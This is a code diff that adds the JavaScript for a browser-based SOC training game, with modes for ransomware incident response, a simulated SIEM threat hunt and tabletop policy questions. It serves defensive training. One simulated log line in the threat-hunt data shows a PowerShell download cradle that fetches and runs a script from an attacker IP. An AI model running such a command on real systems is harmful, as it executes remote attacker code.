+  const qd = LOG_QUESTIONS[logQ];
+  const btns = document.querySelectorAll('#log-questions .act-btn');
+  btns.forEach(b=>b.disabled=true);
+  if(idx===qd.ans){ beepCorrect(); btns[idx].classList.add('correct-flash'); addScore(100); logCorrect++; addSkill('detection',3); }
+  else { beepWrong(); btns[idx].classList.add('wrong-flash'); btns[qd.ans].classList.add('correct-flash'); addScore(-25); }
+  logQ++;
+  setTimeout(renderLogQuestion, 1200);
+}
+
+// ══════════════════════════════════════════════════════════
+// MODE 2: INCIDENT RESPONSE
+// ══════════════════════════════════════════════════════════
+let irStep = 0;
+const IR_SCENARIO = {
+  title:'🪓 Ransomware — Active Encryption on CORP-WS-019',
+  stages:[
+    { label:'Stage 1: Detection', desc:'You receive an alert: 4,200 files encrypted in 2 minutes on CORP-WS-019. What do you do FIRST?',
+      correct:'isolate', opts:['isolate','analyze','notify','recover'],
+      fb:'✓ Correct! Isolation is the top priority to stop spread.', points:150, skill:'containment' },
+    { label:'Stage 2: Evidence', desc:'Host isolated. Before you wipe the system, what MUST you do?',
+      correct:'evidence', opts:['recover','evidence','block','notify'],
+      fb:'✓ Correct! Always capture memory and disk image before remediation.', points:120, skill:'evidence' },
+    { label:'Stage 3: Communication', desc:'You have confirmed ransomware and isolated. Who do you notify?',
+      correct:'notify', opts:['recover','analyze','notify','block'],
+      fb:'✓ Correct! Escalate to CISO and legal within 30 minutes of confirmation.', points:100, skill:'comm' },
+    { label:'Stage 4: Block Spread', desc:'Intelligence shows the attacker IP is 185.234.219.44. What next?',
+      correct:'block', opts:['block','recover','isolate','analyze'],
+      fb:'✓ Correct! Block all egress to the attacker C2 server immediately.', points:130, skill:'policy' },
+    { label:'Stage 5: Recovery', desc:'Systems are clean, attacker evicted, backups verified. Final step?',
+      correct:'recover', opts:['recover','isolate','block','notify'],
+      fb:'✓ Correct! Restore from last known-good backup.', points:200, skill:'recovery' },
+  ]
+};
+
+function renderMode2(){
+  irStep = 0;
+  const scene = document.getElementById('scene');
+  scene.innerHTML = `
+    <div class="scene-title">🚨 Incident Response</div>
+    <div class="scene-sub">Follow the incident response playbook. Each step must be completed in the correct order.</div>
+    ${renderNetworkSVG()}
+    <div id="ir-stage"></div>`;
+  renderIRStage();
+}
+
+function renderNetworkSVG(){
+  return `<div id="net-map"><svg id="net-svg" viewBox="0 0 600 240">
+    <defs><marker id="arr" markerWidth="8" markerHeight="8" refX="8" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="rgba(255,68,68,0.6)"/></marker></defs>
+    <!-- Internet cloud -->
+    <ellipse cx="50" cy="120" rx="40" ry="30" fill="#1a0000" stroke="#ff4444" stroke-width="1.5"/>
+    <text x="50" y="115" text-anchor="middle" class="node-label" fill="#ff4444">INTERNET</text>
+    <text x="50" y="128" text-anchor="middle" class="node-label" fill="#5a5c7a">185.234.219.44</text>
+    <!-- Attack arrow -->
+    <line x1="90" y1="120" x2="145" y2="100" stroke="#ff4444" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#arr)"><animate attributeName="stroke-dashoffset" from="9" to="0" dur="1s" repeatCount="indefinite"/></line>
+    <!-- Firewall -->
+    <rect x="150" y="85" width="50" height="30" rx="4" fill="#0d1218" stroke="#ffaa00" stroke-width="1.5"/>
+    <text x="175" y="102" text-anchor="middle" class="node-label" fill="#ffaa00">FIREWALL</text>
+    <!-- Switch -->
+    <rect x="250" y="105" width="60" height="22" rx="3" fill="#0d0d18" stroke="#00d4ff" stroke-width="1"/>
+    <text x="280" y="120" text-anchor="middle" class="node-label" fill="#00d4ff">SWITCH</text>
+    <line x1="200" y1="100" x2="250" y2="116" stroke="#1e1e35" stroke-width="1.5"/>
+    <!-- INFECTED Workstation -->
+    <circle cx="380" cy="60" r="24" fill="#2a0000" stroke="#ff4444" stroke-width="2" class="node-circle"><animate attributeName="stroke-opacity" values="1;0.2;1" dur="1.5s" repeatCount="indefinite"/></circle>
+    <text x="380" y="55" text-anchor="middle" class="node-label" fill="#ff4444" font-weight="bold">WS-019</text>
+    <text x="380" y="68" text-anchor="middle" class="node-label" fill="#ff4444">🔴 INFECTED</text>
+    <line x1="310" y1="116" x2="360" y2="75" stroke="#ff4444" stroke-width="1.5" stroke-dasharray="4,2"/>
+    <!-- File Server -->
+    <rect x="450" y="80" width="55" height="32" rx="4" fill="#0d0d18" stroke="#1e1e35" stroke-width="1.5"/>
+    <text x="477" y="97" text-anchor="middle" class="node-label">FILE-SRV</text>
+    <line x1="310" y1="116" x2="450" y2="96" stroke="#1e1e35" stroke-width="1"/>
+    <!-- Domain Controller -->
+    <rect x="450" y="145" width="55" height="32" rx="4" fill="#0d0d18" stroke="#1e1e35" stroke-width="1.5"/>
+    <text x="477" y="162" text-anchor="middle" class="node-label">DC-01</text>
+    <line x1="310" y1="116" x2="450" y2="161" stroke="#1e1e35" stroke-width="1"/>
+    <!-- Workstations -->
+    <circle cx="360" cy="175" r="18" fill="#0d0d18" stroke="#1e1e35" stroke-width="1" class="node-circle"/>
+    <text x="360" y="180" text-anchor="middle" class="node-label">WS-001</text>
+    <line x1="310" y1="127" x2="348" y2="162" stroke="#1e1e35" stroke-width="1"/>
+    <circle cx="310" cy="195" r="18" fill="#0d0d18" stroke="#1e1e35" stroke-width="1" class="node-circle"/>
+    <text x="310" y="200" text-anchor="middle" class="node-label">WS-007</text>
+    <line x1="310" y1="127" x2="310" y2="177" stroke="#1e1e35" stroke-width="1"/>
+  </svg></div>`;
+}
+
+function renderIRStage(){
+  if(irStep >= IR_SCENARIO.stages.length){ endMission('Incident successfully contained and recovered!'); return; }
+  const stage = IR_SCENARIO.stages[irStep];
+  const el = document.getElementById('ir-stage');
+  el.innerHTML = `<div class="card">
+    <div style="color:var(--cyan);font-size:0.7rem;text-transform:uppercase;letter-spacing:2px;margin-bottom:6px">${stage.label}</div>
+    <div style="font-size:0.85rem;margin-bottom:14px">${stage.desc}</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+      ${stage.opts.map(o=>`<button class="act-btn" onclick="irAction('${o}')" style="padding:10px">${o.toUpperCase()}</button>`).join('')}
+    </div>
+    <div id="ir-fb" style="display:none;margin-top:10px;padding:8px;border-radius:6px"></div>
+  </div>`;
+}
+
+function irAction(action){
+  const stage = IR_SCENARIO.stages[irStep];
+  const fb = document.getElementById('ir-fb');
+  document.querySelectorAll('#ir-stage .act-btn').forEach(b=>b.disabled=true);
+  if(action===stage.correct){
+    beepCorrect();
+    fb.style.display='block'; fb.style.background='var(--green-g)'; fb.style.borderLeft='3px solid var(--green)';
+    fb.style.color='var(--green)'; fb.textContent=stage.fb;
+    addScore(stage.points); addSkill(stage.skill,5);
+    irStep++;
+    setTimeout(renderIRStage, 1500);
+  } else {
+    beepWrong();
+    fb.style.display='block'; fb.style.background='var(--red-g)'; fb.style.borderLeft='3px solid var(--red)';
+    fb.style.color='var(--red)'; fb.textContent=`✗ Incorrect. Think about the priority at this stage.`;
+    addScore(-30);
+    setTimeout(()=>{ document.querySelectorAll('#ir-stage .act-btn').forEach(b=>b.disabled=false); fb.style.display='none'; }, 1200);
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// MODE 3: THREAT HUNT
+// ══════════════════════════════════════════════════════════
+const HUNT_ANSWERS = ['jsmith','185.234.219.44','T1566','credential stuffing'];
+const HUNT_LOGS = {
+  'search host=* event_id=4625': `[4 results] Logon failures\n2026-02-25 14:12:03 CORP-WS-007  jsmith  185.234.219.44\n2026-02-25 14:12:07 CORP-WS-007  jsmith  185.234.219.44\n2026-02-25 14:12:11 CORP-WS-007  jsmith  185.234.219.44\n→ 3 failures then success. Suspicious.`,
+  'search host=* event_id=4624': `[8 results]\n14:12:19 CORP-WS-007 jsmith 185.234.219.44 ← SUCCESS after 3 failures!`,
+  'search ip=185.234.219.44': `[15 results] All from jsmith on CORP-WS-007\nExternal IP. Not in trusted IP list. BulletProof Hosting.`,
+  'search user=jsmith': `[29 results] Last 2h:\n14:12:03-14:15:50 — 29 events, 6 hosts, suspicious pattern.`,
+  'search event_id=4688 parent=winword.exe': `[1 result] CORP-WS-007 powershell.exe spawned by winword.exe → MACRO EXECUTION!`,
+  'search event_id=4104': `[3 results] PowerShell download cradle detected:\nIEX (New-Object Net.WebClient).DownloadString('http://185.234.219.44/s.ps1')`,
+};
+let huntQuestions = 0, huntCorrect = 0;
+const HUNT_QS = [
+  { q:'Who is the compromised user?', ans:'jsmith' },
+  { q:'What is the attacker C2 IP?', ans:'185.234.219.44' },
+  { q:'What MITRE technique used for initial access?', ans:'T1566' },
+];
+let huntQ = 0;
+
+function renderMode3(){
+  huntQ = 0; huntCorrect = 0;
+  const scene = document.getElementById('scene');
+  scene.innerHTML = `
+    <div class="scene-title">🔍 Threat Hunt</div>
+    <div class="scene-sub">Query the SIEM to find the attacker. Type log queries below.</div>
+    <div style="font-size:0.7rem;color:var(--dim);margin-bottom:8px">Available queries: event_id, host, user, ip, parent. Example: <code style="color:var(--cyan)">search host=CORP-WS-007</code></div>
+    <div class="query-prompt">breach-sim:~$ query&gt;</div>
+    <input class="query-input" id="hunt-input" placeholder="search event_id=4625" onkeydown="if(event.key==='Enter')runQuery()">
+    <div class="query-result" id="query-result">Run a query to start investigating...</div>
+    <div id="hunt-questions" style="margin-top:12px"></div>`;
+  renderHuntQ();
+}
+
+function runQuery(){
+  const q = document.getElementById('hunt-input').value.trim().toLowerCase();
+  const result = document.getElementById('query-result');
+  const key = Object.keys(HUNT_LOGS).find(k => q.includes(k.replace('search ','').split('=')[0]) && (q.includes(k.replace('search ','').split('=')[1])||q===k));
+  if(key){ result.textContent = HUNT_LOGS[key]; beep(440,0.1); }
+  else if(q){ result.textContent = `[0 results] No data matching "${q}". Try: search event_id=4625`; }
+}
+
+function renderHuntQ(){
+  if(huntQ>=HUNT_QS.length){ endMission(`Threat hunt: ${huntCorrect}/${HUNT_QS.length} found`); return; }
+  const q = HUNT_QS[huntQ];
+  const el = document.getElementById('hunt-questions');
+  el.innerHTML = `<div class="card">
+    <div style="color:var(--amber);font-size:0.7rem;text-transform:uppercase;letter-spacing:2px;margin-bottom:6px">🎯 OBJECTIVE</div>
+    <div style="font-size:0.85rem;margin-bottom:10px">${q.q}</div>
+    <div style="display:flex;gap:8px">
+      <input class="query-input" id="hunt-ans" placeholder="Enter your answer" style="flex:1;margin:0">
+      <button onclick="submitHuntAns()" style="background:var(--cyan);border:none;color:#000;padding:8px 14px;border-radius:6px;font-family:inherit;cursor:pointer;font-weight:700">SUBMIT</button>
+    </div>
+    <div id="hunt-fb" style="display:none;margin-top:8px;font-size:0.72rem"></div>
+  </div>`;
+}
+
+function submitHuntAns(){
+  const ans = document.getElementById('hunt-ans').value.trim().toLowerCase();
+  const q = HUNT_QS[huntQ];
+  const fb = document.getElementById('hunt-fb');
+  fb.style.display='block';
+  if(ans.includes(q.ans.toLowerCase())){
+    beepCorrect(); fb.style.color='var(--green)'; fb.textContent='✓ Correct! Good threat hunting.';
+    addScore(150); huntCorrect++; addSkill('detection',5);
+  } else {
+    beepWrong(); fb.style.color='var(--red)'; fb.textContent=`✗ Incorrect. Hint: use the query log to find it.`;
+    addScore(-20);
+  }
+  huntQ++;
+  setTimeout(renderHuntQ, 1200);
+}
+
+// ══════════════════════════════════════════════════════════
+// MODE 4: TABLETOP
+// ══════════════════════════════════════════════════════════
+const TABLETOP_QS = [
+  { q:'Under GDPR, how many hours do you have to notify authorities of a data breach?',
+    opts:['24 hours','48 hours','72 hours','7 days'], ans:2,
+    exp:'GDPR Article 33 requires notification to supervisory authority within 72 hours of becoming aware of a breach.' },
+  { q:'What is the PRIMARY purpose of memory forensics during ransomware response?',
+    opts:['Faster recovery','Capture encryption keys in RAM','Identify patient zero','Report to management'], ans:1,
+    exp:'Ransomware may hold decryption keys in memory. Capturing RAM before reboot can enable free decryption.' },
+  { q:'You discover the attacker is still active on your network. What do you NOT do?',
+    opts:['Isolate affected hosts','Alert the attacker you know they are there','Preserve forensic evidence','Notify your CISO'], ans:1,
+    exp:'Alerting the attacker gives them time to cover their tracks, destroy evidence, or escalate damage.' },
+  { q:'What does the 3-2-1 backup rule require?',
+    opts:['3 daily backups','3 copies, 2 media types, 1 offsite','3 staff members, 2 approvals','3 sites, 2 clouds, 1 tape'], ans:1,
+    exp:'3-2-1: Three copies of data, on two different media types, with one copy stored offsite (offline).' },
+  { q:'An attacker exfiltrated data 3 weeks ago. You only discovered it today. What is your FIRST action?',
+    opts:['Patch all systems immediately','Determine scope of what was exfiltrated','Pay the ransom','Reimage all servers'], ans:1,
+    exp:'Before any action, determine what was stolen, how, and for how long. This drives your legal and remediation response.' },
+];
+let ttQ = 0, ttCorrect = 0;
+
+function renderMode4(){
+  ttQ=0; ttCorrect=0;
+  const scene = document.getElementById('scene');
+  scene.innerHTML = `
+    <div class="scene-title">🗂 Tabletop Exercise</div>
+    <div class="scene-sub">Policy and process knowledge test. 5 questions. Read carefully.</div>
+    <div id="tt-progress" style="display:flex;gap:6px;margin-bottom:12px">
+      ${[...Array(5)].map((_,i)=>`<div id="ttd-${i}" style="flex:1;height:4px;background:var(--border2);border-radius:2px"></div>`).join('')}
+    </div>
+    <div id="tt-q"></div>`;
+  renderTTQ();
+}
+
+function renderTTQ(){
+  if(ttQ>=TABLETOP_QS.length){ endMission(`Tabletop: ${ttCorrect}/5 policies mastered`); return; }
+  const q = TABLETOP_QS[ttQ];
+  document.getElementById('tt-q').innerHTML = `<div class="card">
+    <div style="color:var(--dim);font-size:0.7rem;margin-bottom:8px">Question ${ttQ+1}/5 — Policy Knowledge</div>
+    <div style="font-size:0.9rem;font-weight:700;margin-bottom:16px;line-height:1.5">${q.q}</div>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      ${q.opts.map((o,i)=>`<button class="act-btn" style="text-align:left;padding:12px 14px;width:100%;font-size:0.75rem" onclick="answerTT(${i})">${String.fromCharCode(65+i)}. ${o}</button>`).join('')}
+    </div>
+    <div id="tt-fb" style="display:none;margin-top:12px;padding:10px;border-radius:6px;font-size:0.75rem;line-height:1.5"></div>
+  </div>`;
+}
+
+function answerTT(idx){
+  const q = TABLETOP_QS[ttQ];
+  const btns = document.querySelectorAll('#tt-q .act-btn');
+  const fb = document.getElementById('tt-fb');
+  btns.forEach(b=>b.disabled=true);
+  const dot = document.getElementById(`ttd-${ttQ}`);
+  if(idx===q.ans){
+    beepCorrect(); btns[idx].classList.add('correct-flash');
+    fb.style.display='block'; fb.style.background='var(--green-g)'; fb.style.color='var(--green)';
+    fb.textContent='✓ '+q.exp; dot.style.background='var(--green)';
+    addScore(120); ttCorrect++; addSkill('policy',4);
+  } else {
+    beepWrong(); btns[idx].classList.add('wrong-flash'); btns[q.ans].classList.add('correct-flash');
+    fb.style.display='block'; fb.style.background='var(--red-g)'; fb.style.color='var(--red)';
+    fb.textContent='✗ '+q.exp; dot.style.background='var(--red)'; addScore(-20);
+  }
+  ttQ++;
+  setTimeout(renderTTQ, 2000);
+}
+
+// ══════════════════════════════════════════════════════════
+// GAME ENGINE
+// ══════════════════════════════════════════════════════════
+function renderScene(){
+  if(!S.running){ renderIdleScene(); return; }
+  [renderMode0,renderMode1,renderMode2,renderMode3,renderMode4][currentMode]();
+}
+
+function renderIdleScene(){
+  const scene = document.getElementById('scene');
+  const mode = MODES[currentMode];
+  scene.innerHTML = `
+    <div style="height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:16px;padding:20px">
+      <div style="font-size:4rem;filter:drop-shadow(0 0 20px rgba(0,212,255,0.4))">🛡</div>
+      <div style="font-family:'Sora',sans-serif;font-size:1.5rem;font-weight:700;color:var(--cyan)">${mode.name}</div>
+      <div style="font-size:0.8rem;color:var(--dim);max-width:360px;line-height:1.6">${mode.desc}</div>
+      <div style="display:flex;gap:16px;margin-top:8px">
+        <div style="text-align:center"><div style="font-size:1.4rem;font-weight:700;color:var(--cyan)">${MODE_TIMERS[currentMode]}s</div><div style="font-size:0.6rem;color:var(--dim)">TIME LIMIT</div></div>
+        <div style="text-align:center"><div style="font-size:1.4rem;font-weight:700;color:var(--amber)">${[8,4,5,3,5][currentMode]}</div><div style="font-size:0.6rem;color:var(--dim)">CHALLENGES</div></div>
+      </div>
+      <div style="font-size:0.7rem;color:var(--dim);margin-top:12px">Press START MISSION or use keyboard shortcut <code style="color:var(--cyan)">Space</code></div>
+    </div>`;
+}
+
+function startMission(){
+  if(!actx) initAudio();
+  S.running = true;
+  S.timerSecs = MODE_TIMERS[currentMode];
+  document.getElementById('start-btn').style.display = 'none';
+  document.getElementById('actions-grid').style.display = 'grid';
+  clearInterval(S.timerInterval);
+  S.timerInterval = setInterval(tickTimer, 1000);
+  renderScene();
+  addAlert('info','🚀 Mission Started',`Mode: ${MODES[currentMode].name}`);
+  startAttackFeed();
+}
+
+function tickTimer(){
+  S.timerSecs--;
+  const td = document.getElementById('timer-display');
+  const m = Math.floor(S.timerSecs/60), s = S.timerSecs%60;
+  td.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  td.className = S.timerSecs<=10?'crit':(S.timerSecs<=30?'warn':'');
+  if(S.timerSecs<=30 && S.timerSecs%10===0) beepAlert();
+  if(S.timerSecs<=0){ clearInterval(S.timerInterval); clearInterval(S.attackInterval); endMission('Time expired!'); }
+}
+
+function startAttackFeed(){
+  const attack_pool = THREATS.filter(t=>!t.isFP);
+  clearInterval(S.attackInterval);
+  S.attackInterval = setInterval(()=>{
+    if(!S.running) return;
+    const t = attack_pool[Math.floor(Math.random()*attack_pool.length)];
+    addAlert('crit', t.title, t.desc);
+    beepAlert();
+  }, 8000);
+}
+
+function takeAction(action){
+  const actionMap = {
+    isolate:{correct:['ransomware','lateral','privilege'],pts:100,skill:'containment'},
+    analyze:{correct:['phishing','fp_av','fp_scan'],pts:50,skill:'detection'},
+    block:{correct:['phishing','exfil','lateral'],pts:150,skill:'policy'},
+    notify:{correct:['exfil','privilege','phishing'],pts:75,skill:'comm'},
+    evidence:{correct:['ransomware','lateral','exfil'],pts:80,skill:'evidence'},
+    recover:{correct:['ransomware'],pts:200,skill:'recovery'},
+  };
+  if(!S.currentThreat) return;
+  const t = S.currentThreat;
+  const am = actionMap[action];
+  const fb = document.getElementById('feedback');
+  if(t.correct.includes(action)||am.correct.includes(t.type)){
+    beepCorrect();
+    fb.className='show ok'; fb.textContent=`✓ ${action.toUpperCase()} — correct response. ${t.hint}`;
+    addScore(am.pts + t.xp); addSkill(t.skill||am.skill, 3);
+    checkAchievements();
+    S.currentThreat = null;
+  } else {
+    beepWrong();
+    fb.className='show err'; fb.textContent=`✗ ${action.toUpperCase()} — not the best response here. Think about priorities.`;
+    addScore(-25);
+  }
+  setTimeout(()=>fb.className='', 2000);
+}
+
+function endMission(msg){
+  clearInterval(S.timerInterval); clearInterval(S.attackInterval);
+  S.running = false;
+  const grade = S.score>=400?'A+':S.score>=300?'A':S.score>=200?'B':S.score>=100?'C':'D';
+  const overlay = document.getElementById('score-overlay');
+  document.getElementById('final-grade').textContent = grade;
+  document.getElementById('final-grade').style.color = grade.startsWith('A')?'var(--green)':(grade==='B'?'var(--cyan)':'var(--amber)');
+  document.getElementById('final-score').textContent = `${S.score} pts — ${msg}`;
+  document.getElementById('final-tips').innerHTML = `<div style="margin-bottom:6px;color:var(--amber)">💡 Top Improvements:</div>
+    ${Object.entries(S.skills).sort((a,b)=>a[1]-b[1]).slice(0,3).map(([k,v])=>`<div>• Practice <strong>${k}</strong> scenarios (current: ${v}pts)</div>`).join('')}`;
+  drawRadar('final-radar', S.skills, true);
+  overlay.classList.add('show');
+  beepCorrect(); setTimeout(()=>beep(784,0.3),200); setTimeout(()=>beep(1047,0.5),400);
+}
+
+function resetGame(){
+  S.score=0; S.level=1; S.streak=0; S.xp=0;
+  Object.keys(S.skills).forEach(k=>S.skills[k]=0);
+  document.getElementById('score-overlay').classList.remove('show');
+  document.getElementById('start-btn').style.display='block';
+  document.getElementById('actions-grid').style.display='none';
+  document.getElementById('timer-display').textContent='--:--';
+  document.getElementById('timer-display').className='';
+  ['h-score','h-level','h-streak','h-xp'].forEach(id=>document.getElementById(id).textContent=0);
+  document.getElementById('xp-fill').style.width='0%';
+  document.getElementById('alert-feed').innerHTML='';
+  S.running=false;
+  renderIdleScene();
+}
+
+// ══════════════════════════════════════════════════════════
+// SCORE / XP / SKILLS
+// ══════════════════════════════════════════════════════════
+function addScore(pts){
+  S.score = Math.max(0, S.score+pts);
+  S.xp += Math.max(0,pts);
+  document.getElementById('h-score').textContent = S.score;
+  document.getElementById('h-xp').textContent = S.xp;
+  const tier = XP_THRESHOLDS.findIndex((t,i)=>S.xp<(XP_THRESHOLDS[i+1]||99999));
+  S.level = Math.max(1, tier+1);
+  document.getElementById('h-level').textContent = S.level;
+  document.getElementById('tier-label').textContent = TIER_NAMES[Math.min(4,tier)];
+  const nextTier = XP_THRESHOLDS[Math.min(4,tier+1)]||XP_THRESHOLDS[4];
+  const prevTier = XP_THRESHOLDS[tier]||0;
+  document.getElementById('xp-label').textContent = `${S.xp} / ${nextTier} XP`;
+  document.getElementById('xp-fill').style.width = `${Math.min(100,(S.xp-prevTier)/(nextTier-prevTier)*100)}%`;
+  if(pts>0){ S.streak++; document.getElementById('h-streak').textContent=S.streak; }
+  else S.streak=0;
+  drawRadar('radar-canvas', S.skills, false);
+}
+
+function addSkill(skill, pts){
+  if(skill in S.skills) S.skills[skill] = Math.min(100, S.skills[skill]+pts);
+}
+
+// ══════════════════════════════════════════════════════════
+// ALERTS
+// ══════════════════════════════════════════════════════════
+function addAlert(type, title, desc){
+  const feed = document.getElementById('alert-feed');
+  const el = document.createElement('div');
+  el.className = `alert-item ${type}`;
+  el.innerHTML = `<div class="alert-ts">${new Date().toLocaleTimeString()}</div><div class="alert-title">${title}</div><div class="alert-desc">${desc}</div>`;
+  el.onclick = ()=>{
+    const threat = THREATS.find(t=>t.title===title);
+    if(threat){ S.currentThreat=threat; showFeedback(`🎯 Active threat: ${title}. Use action buttons to respond.`,'info'); }
+  };
+  feed.insertBefore(el, feed.firstChild);
+  while(feed.children.length>10) feed.removeChild(feed.lastChild);
+}
+
+function showFeedback(msg, type){
+  const fb=document.getElementById('feedback');
+  fb.className=`show ${type==='info'?'ok':'err'}`; fb.textContent=msg;
+  setTimeout(()=>fb.className='',3000);
+}
+
+// ══════════════════════════════════════════════════════════
+// RADAR CHART — Canvas
+// ══════════════════════════════════════════════════════════
+function drawRadar(canvasId, skills, large){
+  const canvas = document.getElementById(canvasId);
+  if(!canvas) return;
+  const ctx = canvas.getContext('2d');
+  const W = canvas.width, H = canvas.height;
+  const cx = W/2, cy = H/2, r = Math.min(W,H)*0.38;
+  const labels = ['detection','mitre','containment','policy','evidence','comm','recovery','efficiency'];
+  const displayLabels = ['Detect','MITRE','Contain','Policy','Evidence','Comms','Recovery','Efficiency'];
+  const n = labels.length;
+  ctx.clearRect(0,0,W,H);
+
+  // Draw grid rings
+  for(let ring=1;ring<=4;ring++){
+    ctx.beginPath();
+    for(let i=0;i<n;i++){
+      const angle = Math.PI/2 - 2*Math.PI*i/n;
+      const x = cx + (r*ring/4)*Math.cos(angle);
+      const y = cy - (r*ring/4)*Math.sin(angle);
+      i===0?ctx.moveTo(x,y):ctx.lineTo(x,y);
+    }
+    ctx.closePath();
+    ctx.strokeStyle = 'rgba(30,30,53,0.8)'; ctx.lineWidth=1; ctx.stroke();
+  }
+
+  // Draw spokes
+  for(let i=0;i<n;i++){
+    const angle = Math.PI/2 - 2*Math.PI*i/n;
+    ctx.beginPath();
+    ctx.moveTo(cx,cy);
+    ctx.lineTo(cx+r*Math.cos(angle), cy-r*Math.sin(angle));
+    ctx.strokeStyle='rgba(30,30,53,0.8)'; ctx.lineWidth=1; ctx.stroke();
+  }
+
+  // Draw data
+  const vals = labels.map(k=>Math.min(100,skills[k]||0)/100);
+  ctx.beginPath();
+  for(let i=0;i<n;i++){
+    const angle=Math.PI/2-2*Math.PI*i/n;
+    const x=cx+r*vals[i]*Math.cos(angle);
+    const y=cy-r*vals[i]*Math.sin(angle);
+    i===0?ctx.moveTo(x,y):ctx.lineTo(x,y);
+  }
+  ctx.closePath();
+  ctx.fillStyle='rgba(0,212,255,0.15)'; ctx.fill();
+  ctx.strokeStyle='#00d4ff'; ctx.lineWidth=2; ctx.stroke();
+
+  // Dots
+  for(let i=0;i<n;i++){
+    const angle=Math.PI/2-2*Math.PI*i/n;
+    const x=cx+r*vals[i]*Math.cos(angle);
+    const y=cy-r*vals[i]*Math.sin(angle);
+    ctx.beginPath(); ctx.arc(x,y,3,0,Math.PI*2);
+    ctx.fillStyle='#00d4ff'; ctx.fill();
+  }
+
+  // Labels
+  ctx.fillStyle='#5a5c7a'; ctx.font=`${large?10:9}px 'Space Mono',monospace`; ctx.textAlign='center';
+  for(let i=0;i<n;i++){
+    const angle=Math.PI/2-2*Math.PI*i/n;
+    const lx=cx+(r+18)*Math.cos(angle);
+    const ly=cy-(r+18)*Math.sin(angle);
+    ctx.fillText(displayLabels[i],lx,ly+4);
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// ACHIEVEMENTS
+// ══════════════════════════════════════════════════════════
+function checkAchievements(){
+  const achievements = [
+    {id:'first_blood', label:'🩸 First Blood', cond:()=>S.score>=50},
+    {id:'streak3', label:'🔥 On Fire (3 streak)', cond:()=>S.streak>=3},
+    {id:'century', label:'💯 Century', cond:()=>S.score>=100},
+    {id:'tier2', label:'⬆️ Tier 2 Analyst', cond:()=>S.level>=2},
+    {id:'detector', label:'👁️ Eagle Eye', cond:()=>S.skills.detection>=20},
+  ];
+  achievements.forEach(a=>{
+    if(!S.achievements.has(a.id) && a.cond()){
+      S.achievements.add(a.id);
+      showAchievement(a.label);
+    }
+  });
+}
+
+function showAchievement(text){
+  const el = document.getElementById('achievement-popup');
+  document.getElementById('ach-text').textContent = text;
+  el.classList.add('show');
+  beep(1047,0.1); setTimeout(()=>beep(1319,0.15),120); setTimeout(()=>beep(1568,0.2),240);
+  setTimeout(()=>el.classList.remove('show'), 3500);
+}
+
+// ══════════════════════════════════════════════════════════
+// KEYBOARD SHORTCUTS
+// ══════════════════════════════════════════════════════════
+document.addEventListener('keydown', e=>{
+  if(!S.running) return;
+  const map = {1:'isolate',2:'analyze',3:'block',4:'notify',5:'evidence',6:'recover'};
+  if(map[e.key]) takeAction(map[e.key]);
+  if(e.key===' '){ e.preventDefault(); if(!S.running) startMission(); }
+});
+document.addEventListener('keydown', e=>{ if(e.key===' '&&!S.running){ e.preventDefault(); startMission(); }});
+
+// ══════════════════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════════════════
+drawRadar('radar-canvas', S.skills, false);
+renderIdleScene();
+addAlert('info','🛡 SOC Simulator Ready','Select a mission mode and press START. Keyboard: 1-6 for actions.');
+addAlert('warn','📡 Threat Intel','APT-41 active in your sector. Expect credential attacks and data exfiltration.');
+</script>
+</body>
+</html>
